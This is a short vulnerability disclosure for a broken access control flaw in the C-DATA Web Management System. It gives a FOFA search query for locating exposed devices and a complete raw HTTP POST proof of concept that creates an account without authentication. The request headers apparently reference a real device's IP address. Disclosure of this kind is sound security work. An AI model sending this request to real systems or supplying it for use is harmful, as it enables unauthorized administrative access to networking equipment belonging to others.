## C-DATA Web Management System Arbitrary User Create

C-DATA Web Management System has a broken access control, which will result in arbitrary user create.
fofa: title=="Wi-Fi Web管理"

POC below：

```
POST /cgi-bin/jumpto.php?class=user&page=config_save&isphp=1 HTTP/1.1
Host: ********
Content-Length: 64
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://176.118.126.224
Referer: http://176.118.126.224/cgi-bin/jumpto.php?class=system&page=ls
Accept-Language: zh-CN,zh;q=0.9
Connection: close

call_function=user&opt=3&user=foofoo&level=2&newpassword=foofoo123

```

![image](https://github.com/sleepyvv/vul_report/assets/55875284/f6f9d46d-322c-4283-83ac-11898414aeb3)

Note: no cookie in the request header 

Then we can see the user is successfully created.

![image](https://github.com/sleepyvv/vul_report/assets/55875284/5c3ab103-8af8-4a43-9606-9d2313c82e19)
